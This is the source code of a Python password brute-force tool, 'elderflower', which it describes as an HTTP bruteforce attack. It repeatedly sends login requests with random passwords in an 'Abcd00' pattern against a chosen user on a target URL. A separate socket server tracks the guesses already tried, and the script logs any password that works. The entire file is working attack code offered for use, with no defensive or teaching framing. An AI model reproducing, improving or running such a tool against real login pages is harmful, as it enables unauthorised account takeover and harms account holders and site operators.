# scripted by @n4zgu1
# elderflower v1.0.3
# http bruteforce attack
# Github: https://github.com/n4zgu1/elderflower

import requests
import socket
import random
import time
import os
from urllib3.exceptions import ConnectionError


uppercase = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
lowercase = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
digits =    ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ]

pwLog = 'elderflower.log'           # the found password will be logged here
errorLog = 'error.log'              # errors will be logged here
trigger = 'example'                 # trigger for successfull login
used = []


# request to server
def req(url, username, password):
    payload = {'do':'login', 'user':f'{username}', 'pw':f'{password}'}      # payload for request
    try:
        r = requests.get(f"{url}" , params=payload, verify=True)
        while trigger not in r.text:
            r.close()
            return False
        print(f"{'='*50}\nusername: {username}\npassword: {password}\n{'='*50}")
        log(pwLog, r.url)
        return True
    except ConnectionError as e:
        log(errorLog, e)
        print("++++++++++Timeout++++++++++")
        time.sleep(60)
    except KeyboardInterrupt:
        print("KeyboardInterrupt")
        exit(0)       
    except Exception as e:
            log(errorLog, e)
                
                   
# generate random passwords in this pattern "Abcd00"
def randPW():
    a = random.choice(uppercase)
    b = ''.join(random.choice(lowercase) for x in range(3))
    c = ''.join(random.choice(digits) for x in range(2))

    password = a+b+c
    return password
   
    
# check if password is already used
def getPW(host, port, verbose):
    while not (update(host, port, (password := randPW()), verbose)):               
        used.append(password)
        break
    if verbose:
        print(f'Try: {password} -- {len(used)}')
    return password


# send used passwords to server
def update(host, port, password, verbose):
    try:
        sock = socket.socket()
        sock.connect((host, port))
        sock.send(password.encode('utf-8'))
        if verbose: print('call -', end='')
        res = sock.recv(1024).decode('utf-8')
        if verbose: print(f'- response: {res}')
        sock.close()
        if res == 'True': return True
        return False     
    except Exception as e: print(f'Something went wrong! [update]\n{e}'); time.sleep(5)   


# log found passwords or errors
def log(file, str):
    timestamp = time.ctime(time.time())
    with open(file, 'a') as f_log:
        f_log.write(f'{timestamp}\n{str}\n\n\n')


# main function
def elderflower(url, target, host, port, verbose):
    print(f'''{'='*50}
          Elderflower v1.0.3
          scripted by @n4zgu1
            
          
          
          URL: {url}
          User: {target}\n
{'='*50}\n\n''')
    print('Start attack at', time.ctime(time.time()), '\n')
    while not (x:= req(url, target, getPW(host, port, verbose))):
        if verbose:
            print('Password wrong!\n')
        time.sleep(0.8)
    print('Attack successfull :=)')